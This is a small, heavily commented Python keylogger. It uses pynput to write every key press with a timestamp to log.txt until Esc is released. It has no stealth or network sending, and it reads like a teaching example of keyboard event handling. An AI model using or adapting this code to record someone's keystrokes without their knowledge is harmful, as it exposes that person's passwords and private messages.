# Import the necessary tool to work with keyboard events
from pynput.keyboard import Listener, Key
# Import a tool to help with recording what happens
import logging

# Set up how we want to record what happens
logging.basicConfig(filename="log.txt", level=logging.DEBUG, format='%(message)s:%(asctime)s')

# This function runs when a key is pressed
def while_press(key):
    # Create a message that says which key was pressed
    KEY = "Key {} pressed".format(key) 
    
    # Save the message to our recording
    logging.info(KEY)

# This function runs when a key is released
def while_release(key):
    # Check if the released key is the 'esc' key
    if key == Key.esc:
        # If the 'esc' key is released, stop listening
        return False

# Start listening to keyboard events
with Listener(on_press=while_press, on_release=while_release) as listener:
    # Keep listening until told to stop
    listener.join()
